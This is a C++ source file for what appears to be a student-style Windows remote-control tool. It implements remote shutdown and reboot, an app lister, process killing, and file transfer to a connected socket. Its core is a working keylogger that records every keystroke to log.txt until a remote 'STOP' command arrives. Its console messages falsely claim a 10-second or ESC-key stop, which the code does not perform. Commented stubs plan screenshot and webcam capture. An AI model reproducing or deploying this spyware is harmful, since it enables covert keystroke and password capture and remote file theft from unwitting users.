#include "Utility.h"
#include <vector>
#include <windows.h>
#include<fstream>
#include<iostream>
#include<shlobj.h>
#include<filesystem>
#include<locale>
#include<codecvt>

void Computer::shutdown() {
    system("shutdown /s /f /t 0");
}
void Computer::reset() {
    #ifdef _WIN32
        system("shutdown /r /t 0");  // Lệnh restart cho Windows
    #elif __linux__
        system("sudo reboot");       // Lệnh restart cho Linux
    #elif __APPLE__
        system("sudo shutdown -r now");  // Lệnh restart cho macOS
    #else
        #error "Operating system is not supported"
    #endif
}
static std::atomic<bool> running{true};
void keyboardMonitor() {
    std::ofstream log;
    int c;
    log.open("log.txt");
    while (running) {
        for (c = 0; c <= 254; c++) {
            if (GetAsyncKeyState(c)  == -32767) {
                // std::ofstream log;
                // log.open("log.txt", std::ios::app);
                switch (c) {
                    case VK_ESCAPE:
                        log << "[esc]";
                        break;
                    case VK_SPACE:
                        log << "[space]";
                        break;
                    case VK_BACK:
                        log << "[backspace]";
                        break;
                    case VK_RETURN:
                        log << "[enter]";
                        break;
                    case VK_SHIFT:
                        log << "[shift]";
                        break;
                    case VK_CONTROL:
                        log << "[ctrl]";
                        break;
                    case VK_CAPITAL:
                        log << "[caps]";
                        break;
                    case VK_TAB:
                        log << "[tab]";
                        break;
                    case VK_MENU:
                        log << "[alt]";
                        break;
                    case VK_LBUTTON:
                        log << "[Lclick]";
                        break;
                    case VK_RBUTTON:
                        log << "[Rclick]";
                        break;
                    default: 
                        log << (char) c;
                        break;
                }
                // log.close();
            }
        }
    }
    log.close();
}


void displayKeyPress(const char* action, int key) {
    std::cout << action << ": " << (char)key 
              << " (ASCII: " << key << ")" << std::endl;
}

// void keyboardMonitor() {
//     std::cout << "Keyboard monitoring started. Press ESC to exit.\n";
//     int ok = 0;
//     ofstream fout;
//     fout.open("log.txt", std::ios::app);
//     if (!fout.is_open())
//         cout << "Cannot open file! \n";
//     while(running) {
//         for(int key = 8; key <= 255; key++) {
//             if(GetAsyncKeyState(key) == -32767) {
//                 // if(key == VK_ESCAPE) {
//                 //     running = false;
//                 //     break;
//                 // }
//                 // if (ok == 0) {
//                 //     ok = 1;
//                 //     ofstream fout;
//                 //     fout.open("log.txt", std::ios::app);
//                 // }
//                 // ofstream fout;
//                 // fout.open("log.txt", std::ios::app);
//                 // //displayKeyPress("Key pressed", key);
//                     fout << "Key pressed" << ": " << (char)key << " (ASCII: " << key << ")" << std::endl;
//                 // while(fout.is_open())
//                 //     fout.close();
//             }
//         }
//         std::this_thread::sleep_for(std::chrono::milliseconds(10));
//     }
//     fout.close();
//     if (!fout.is_open())
//         cout << "Closed file! \n";
// }



// Example of how to use timer to stop monitoring after specific duration
void stopAfterDelay(SOCKET serverSocket) {
    char buffer[1024];
    int byteCount;
    while(true) {
        byteCount = recv(serverSocket, buffer, 1024, 0);
            if (byteCount > 0) {
                buffer[byteCount] = '\0';
                std::cout << buffer << "\n";
                if (strcmp(buffer, "STOP") == 0) {
                    running = false;
                    return;
                }
            }
    }
}

void Computer::keyLogger(SOCKET serverSocket) {
    std::cout << "Starting keyboard input monitor...\n";
    std::cout << "All keyboard input will be displayed in this window.\n";
    std::cout << "This program runs with user awareness for input testing.\n";
    std::cout << "Program will stop after 10 seconds or press ESC to exit.\n\n";

    // Start monitoring thread
    std::thread monitorThread(keyboardMonitor);
    
    // Create another thread to stop monitoring after 10 seconds
    std::thread timerThread(stopAfterDelay, serverSocket);
    // Wait for monitoring thread to finish
    monitorThread.join();
    
    // Wait for timer thread to finish
    timerThread.join();
    running = true;

}

// Hàm lấy danh sách ứng dụng từ thư mục
std::vector<std::wstring> getAppList(const std::wstring& directory) {
    std::vector<std::wstring> apps;
    for (const auto& entry : std::filesystem::recursive_directory_iterator(directory)) {
        if (entry.path().extension() == L".lnk") {  // Kiểm tra nếu là shortcut (.lnk)
            apps.push_back(entry.path().wstring());
        }
    }
    return apps;
}

// Hàm chuyển đổi từ std::wstring sang std::string UTF-8
std::string wstringToUtf8(const std::wstring& wstr) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    return converter.to_bytes(wstr);
}

// Hàm ghi danh sách ứng dụng vào tệp
void saveAppListToFile(const std::vector<std::wstring>& app1, const std::vector<std::wstring>& app2, const wchar_t* filename) {
    // Mở tệp để ghi bằng std::ofstream (dùng std::string thay vì std::wstring)
    std::ofstream file(wstringToUtf8(filename), std::ios::out);

    if (!file.is_open()) {
        std::wcerr << L"Không thể mở tệp để ghi: " << filename << std::endl;
        return;
    }

    for (const auto& app : app1) {
        file << wstringToUtf8(app) << std::endl;  // Chuyển đổi mỗi ứng dụng thành UTF-8 và ghi vào tệp
    }
    for (const auto& app : app2) {
        file << wstringToUtf8(app) << std::endl;  // Chuyển đổi mỗi ứng dụng thành UTF-8 và ghi vào tệp
    }

    file.close();
    std::wcout << L"Danh sach ung dung duoc dua vao tep " << filename << std::endl;
}

// Hàm liệt kê ứng dụng và lưu vào tệp
void Computer::listApp() {
    wchar_t startMenuPath[MAX_PATH];
    wchar_t desktopPath[MAX_PATH];
    std::vector<std::wstring> startMenuApps;
    std::vector<std::wstring> desktopApps;

    // Lấy đường dẫn tới thư mục Start Menu
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_STARTMENU, NULL, 0, startMenuPath))) {
        std::wcout << L"Applications in Start Menu:\n";
        startMenuApps = getAppList(startMenuPath);
        //saveAppListToFile(startMenuApps, L"start_menu_apps.txt");  // Ghi vào tệp start_menu_apps.txt
    }

    // Lấy đường dẫn tới thư mục Desktop
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath))) {
        std::wcout << L"\nApplications on Desktop:\n";
        desktopApps = getAppList(desktopPath);
        //saveAppListToFile(desktopApps, L"desktop_apps.txt");  // Ghi vào tệp desktop_apps.txt
    }
    saveAppListToFile(startMenuApps, desktopApps, L"listApp.txt");
}
void Computer::startApp(std::string name) {
    std::wstring appPath(name.begin(), name.end());
    // Sử dụng ShellExecuteW để chạy ứng dụng từ đường dẫn shortcut
    HINSTANCE result = ShellExecuteW(NULL, L"open", appPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
    if ((LONG_PTR)result <= 32) {
        std::wcerr << L"Failed to open application: " << appPath << std::endl;
    } else {
        std::wcout << L"Running application: " << appPath << std::endl;
    }
}

// Hàm để lấy đường dẫn file thực thi từ file .lnk
std::string ResolveShortcut(const std::string& lnkPath) {
    CoInitialize(NULL);
    std::string exePath;
    IShellLink* pShellLink = nullptr;

    if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&pShellLink))) {
        IPersistFile* pPersistFile = nullptr;
        if (SUCCEEDED(pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pPersistFile))) {
            WCHAR wsz[MAX_PATH];
            MultiByteToWideChar(CP_ACP, 0, lnkPath.c_str(), -1, wsz, MAX_PATH);
            if (SUCCEEDED(pPersistFile->Load(wsz, STGM_READ))) {
                char szExePath[MAX_PATH];
                if (SUCCEEDED(pShellLink->GetPath(szExePath, MAX_PATH, NULL, 0))) {
                    exePath = szExePath;
                }
            }
            pPersistFile->Release();
        }
        pShellLink->Release();
    }
    CoUninitialize();
    return exePath;
}

// Hàm để lấy PID của một tiến trình từ tên file thực thi
DWORD GetProcessID(const std::string& processName) {
    DWORD processID = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, processName.c_str()) == 0) {
                    processID = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return processID;
}

// Hàm để tắt tiến trình dựa trên tên file thực thi
bool TerminateProcessByName(const std::string& processName) {
    DWORD processID = GetProcessID(processName);
    if (processID == 0) {
        std::cout << "Khong tim thay tien trinh. Loi: " << processName << std::endl;
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processID);
    if (hProcess == NULL) {
        std::cout << "Khong the mo tien trinh. Loi: " << GetLastError() << std::endl;
        return false;
    }

    // Tắt tiến trình
    bool result = TerminateProcess(hProcess, 0);
    if (!result) {
        std::cout << "Khong the tat tien trinh. Loi: " << GetLastError() << std::endl;
    } else {
        std::cout << "Da tat tien trinh: " << processName << std::endl;
    }

    CloseHandle(hProcess);
    return result;
}

void Computer::stopApp(std::string name) {
    std::string exePath = ResolveShortcut(name);
    std::string processName = exePath.substr(exePath.find_last_of("\\/") + 1);
    TerminateProcessByName(processName);
}

void Computer::copyFile(SOCKET clientSocket, const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "Failed to open file." << std::endl;
        return;
    }

    // Get file size
    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg);
    std::cout << 4;
    // Send file info header: "SendFile: filename filesize"
    std::string filename = filePath.substr(filePath.find_last_of("/\\") + 1);
    std::string fileHeader = "SendFile: " + filename + " " + std::to_string(fileSize);
    send(clientSocket, fileHeader.c_str(), fileHeader.size(), 0);

    // Wait for confirmation from the receiver
    char ackBuffer[10];
    recv(clientSocket, ackBuffer, sizeof(ackBuffer), 0);

    // Send file contents in chunks
    char buffer[BUFFER_SIZE];
    std::streamsize totalSent = 0;
    std::cout << 5;
    while (file) {
        file.read(buffer, BUFFER_SIZE);
        std::streamsize bytesToSend = file.gcount();

        int bytesSent = 0;
        while (bytesSent < bytesToSend) {
            int sent = send(clientSocket, buffer + bytesSent, bytesToSend - bytesSent, 0);
            if (sent == SOCKET_ERROR) {
                std::cerr << "Error sending file." << std::endl;
                return;
            }
            bytesSent += sent;
        }
        totalSent += bytesSent;
    }
    std::cout << 6;
    // Send end-of-file signal
    std::string endSignal = "FileEnd";
    send(clientSocket, endSignal.c_str(), endSignal.size(), 0);

    file.close();
    std::cout << "File sent successfully. Total bytes sent: " << totalSent << std::endl;
}

// void listService();
// void startService(std::string name);
// void stopService(std::string name);
// void screenShot();
// void copyFile(std::string name);
// void startWebcam();
// void stopWebcam();


